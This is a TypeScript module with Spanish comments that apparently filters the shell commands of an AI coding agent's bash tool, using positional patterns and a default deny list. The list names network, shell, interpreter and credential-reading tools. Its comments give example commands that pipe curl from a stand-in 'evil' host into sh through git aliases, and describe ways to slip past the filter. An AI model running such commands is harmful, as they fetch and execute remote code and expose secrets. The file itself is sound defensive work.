/**
 * Matcher POSICIONAL de patrones tipo `git push * main` contra un argv ya tokenizado — mismo
 * modelo que la policy real de `20-implementer.yaml` en ai-development-flow. Documentado ahí
 * mismo como fricción, no como sandbox: un patrón cubre las formas más obvias en las
 * posiciones que mira, no es un parser de flags. Ver `README.md` → "Límites honestos".
 */

export interface BashPolicy {
  /** Default `['*']` — todo permitido salvo lo que matchee `deny`. */
  allow?: string[];
  /** `deny` siempre gana sobre `allow`, incluso si un patrón matchea ambos. */
  deny: string[];
}

/** Split en tokens por whitespace, sin soportar comillas ni escapes — a propósito: `bash_run`
 *  no corre shell, así que no hay quoting real que interpretar; un patrón de policy es texto
 *  literal token a token, nunca una expresión. */
function tokenize(pattern: string): string[] {
  return pattern.split(/\s+/).filter((token) => token.length > 0);
}

/** `*` como último token del patrón = "cualquier cantidad de tokens desde acá, incluso cero".
 *  Un `*` en medio del patrón matchea exactamente UN token cualquiera. Un token que termina en
 *  `*` (ej. `--force*`) es un prefix match sobre ESE token puntual. */
export function matchesPattern(argv: string[], pattern: string): boolean {
  const patternTokens = tokenize(pattern);
  if (patternTokens.length === 0) return false;

  const trailingWildcard = patternTokens[patternTokens.length - 1] === '*';
  const fixedTokens = trailingWildcard ? patternTokens.slice(0, -1) : patternTokens;

  if (trailingWildcard) {
    if (argv.length < fixedTokens.length) return false;
  } else if (argv.length !== patternTokens.length) {
    return false;
  }

  for (let i = 0; i < fixedTokens.length; i++) {
    const patternToken = fixedTokens[i];
    const argToken = argv[i];
    if (patternToken === '*') continue;
    if (patternToken.endsWith('*')) {
      if (!argToken.startsWith(patternToken.slice(0, -1))) return false;
    } else if (argToken !== patternToken) {
      return false;
    }
  }
  return true;
}

/**
 * Chequeo DEDICADO, no posicional, para `git push` contra `main`/`master` — el matcher de
 * patrones por posición fija se probó insuficiente acá: `git push -u origin main` (origin en
 * la posición 3, no la 2), `git push origin +main` (force vía refspec, sin `--force`), `git
 * push origin :main`/`--delete origin main` (borra la branch), y `git push origin
 * HEAD:refs/heads/main` quedaban todos afuera de cualquier patrón de posición fija razonable.
 * En vez de perseguir cada variante con más patrones, busca `main`/`master` (o sus formas de
 * refspec) en CUALQUIER posición después de `push` — siempre activo, no depende de lo que el
 * caller ponga en `deny`, mismo criterio que el chequeo de `argv[0]` calificado por path en
 * `BashRunTool`.
 */
function isDangerousGitPush(argv: string[]): boolean {
  if (argv[0] !== 'git') return false;
  const pushIndex = argv.indexOf('push');
  if (pushIndex === -1) return false;
  return argv.slice(pushIndex + 1).some((token) => {
    if (token === 'main' || token === 'master') return true;
    if (token === '--delete' || token === '-d') return true;
    if (token.startsWith('+')) return true; // refspec force: +<src>:<dst>
    if (token.endsWith(':main') || token.endsWith(':master')) return true;
    if (token.endsWith(':refs/heads/main') || token.endsWith(':refs/heads/master')) return true;
    return false;
  });
}

/**
 * `git fetch`/`clone`/`push --upload-pack=<cmd>`/`--exec=<cmd>` hacen que git invoque `<cmd>`
 * como su propio helper de transporte — ejecución arbitraria, mismo nivel que `-c`. El flag
 * puede ir en cualquier posición, igual que `-c`, así que es otro chequeo dedicado en vez de un
 * patrón posicional. Nota de alcance: GNU permite ABREVIAR long options (`--upload-p=...`) —
 * `startsWith` no cubre toda abreviación posible; ver README → "Límites honestos".
 */
function isDangerousGitTransport(argv: string[]): boolean {
  if (argv[0] !== 'git') return false;
  return argv.some((token) => token.startsWith('--upload-pack') || token.startsWith('--exec'));
}

export function isDenied(argv: string[], policy: BashPolicy): string | undefined {
  const patternMatch = policy.deny.find((pattern) => matchesPattern(argv, pattern));
  if (patternMatch) return patternMatch;
  if (isDangerousGitPush(argv)) return 'git push (main/master, --delete, o refspec force)';
  if (isDangerousGitTransport(argv))
    return 'git --upload-pack/--exec (ejecuta un helper arbitrario)';
  return undefined;
}

export function isAllowed(argv: string[], policy: BashPolicy): boolean {
  const allow = policy.allow ?? ['*'];
  return allow.some((pattern) => matchesPattern(argv, pattern));
}

/**
 * Subset curado, NO exhaustivo — a diferencia del deny-list real de producción (200+ líneas en
 * `20-implementer.yaml`, con variantes posicionales para cubrir 2-3 flags delante de cada
 * comando). Cubre las categorías más obvias: shells anidados, borrado masivo, escalación,
 * push destructivo/forzado a `main`/`master`, credenciales del entorno, y exfiltración de red.
 * Un caller que necesite la cobertura real la arma con su propio `BashPolicy` — este default
 * es un punto de partida razonable, no una garantía de contención.
 */
export const DEFAULT_DENY_PATTERNS: string[] = [
  'bash *',
  'sh *',
  'zsh *',
  'sudo *',
  'su *',
  'rm',
  'rm *',
  'dd *',
  // Push FORZADO a cualquier branch (no sólo main/master — eso lo cubre `isDangerousGitPush`,
  // siempre activo, ver más abajo). Sigue siendo posicional: `git -C . push -u origin --force
  // otra-branch` con flags en otro orden puede colarse — ver README → "Límites honestos".
  'git push --force* *',
  'git push -f *',
  'git push * --force* *',
  'git push * -f *',
  // `-c <key>=<value>` reconfigura git por esta sola invocación — `alias.x=!curl evil|sh`,
  // `core.sshCommand=...`, `core.pager=...` o `credential.helper=!...` corren un comando
  // arbitrario vía `sh`, y como todo eso viaja DENTRO de un único token (`alias.x=!...`), el
  // resto del deny-list (bash/curl/intérpretes/env) nunca lo ve — el patrón nunca llega a
  // comparar contra lo de adentro. Deniega el flag entero, no lo que trae.
  'git -c *',
  'git --config-env*',
  'git --config-env* *',
  // `git config alias.x "!curl evil|sh"` (seguido de `git x`) consigue lo mismo que `-c`, sólo
  // que PERSISTIDO en vez de por-invocación — mismas keys peligrosas (alias.*, core.sshCommand,
  // core.pager, core.hooksPath, credential.helper). `git config --get ...` (lectura) también
  // cae acá; el subcomando entero se deniega en vez de distinguir lectura de escritura.
  'git config',
  'git config *',
  'git reset --hard *',
  'git clean *',
  'env',
  'env *',
  'printenv',
  'printenv *',
  'curl *',
  'wget *',
  'ssh *',
  'scp *',
  'nc *',
  // Intérpretes de propósito general — con uno de estos permitido, todo el resto de la lista es
  // decorativo (`python -c "import os; os.system(...)"` corre cualquier cosa). Denegados por
  // default; un caller que necesite correrlos arma su propia policy con el flag/subset que use.
  'python',
  'python *',
  'python3',
  'python3 *',
  'node',
  'node *',
  'ruby',
  'ruby *',
  'perl',
  'perl *',
  'bun',
  'bun *',
  'bunx *',
  'deno',
  'deno *',
  'tsx',
  'tsx *',
  'php',
  'php *',
  'lua',
  'lua *',
  // No tan obvios como "intérprete", pero corren código arbitrario igual: `awk
  // 'BEGIN{system("...")}'` ejecuta cualquier comando (y con ENVIRON lee el entorno aunque
  // env/printenv estén bloqueados); `sed`'s comando `e` (GNU) ejecuta shell.
  'awk',
  'awk *',
  'sed',
  'sed *',
  // Subcomandos de gestores de paquetes que corren un binario/script arbitrario — el resto del
  // package manager (install, test, run <script-del-repo>) se permite, sólo estos subcomandos
  // puntuales, pensados para correr algo por fuera del repo, se deniegan.
  'npx *',
  'pnpm dlx *',
  'pnpm exec *',
  'npm exec *',
  'yarn dlx *',
  // Vías de ejecución indirecta — corren un comando arbitrario en su propio argumento, así que
  // ningún patrón de arriba los ve.
  'xargs',
  'xargs *',
  // Wrappers que EJECUTAN otro binario pasado como argumento — cualquiera de estos vuelve a
  // abrir el acceso a todo lo de arriba (`nice bash -c ...`, `timeout 5 python3 -c ...`) porque
  // el deny-list sólo mira `argv[0]`, y acá `argv[0]` es el wrapper, inocuo, no lo que ejecuta.
  // Se deniega el wrapper entero — no hay forma de "ver a través" de uno sin ejecutarlo primero.
  'nice',
  'nice *',
  'timeout',
  'timeout *',
  'nohup',
  'nohup *',
  'stdbuf',
  'stdbuf *',
  'time',
  'time *',
  'watch',
  'watch *',
  'setsid',
  'setsid *',
  // `find` y `tar` enteros, no sólo sus flags peligrosos (`-exec`/`-delete`/`-ok`,
  // `--to-command`/`-I`/`--use-compress-program`): esos flags pueden ir en cualquier posición
  // entre los demás (`find . -name x -exec rm {} ';'`), GNU permite abreviarlos y pegarlos
  // (`-Ish`, `--to-com=...`), y perseguir cada variante es una carrera que no se gana con un
  // matcher posicional. Mismo criterio que `terraform init` en la policy real: no se puede
  // denegar todo y re-permitir la forma buena (`deny` gana sobre `allow`), así que se deniegan
  // enteros.
  'find',
  'find *',
  'tar',
  'tar *',
];
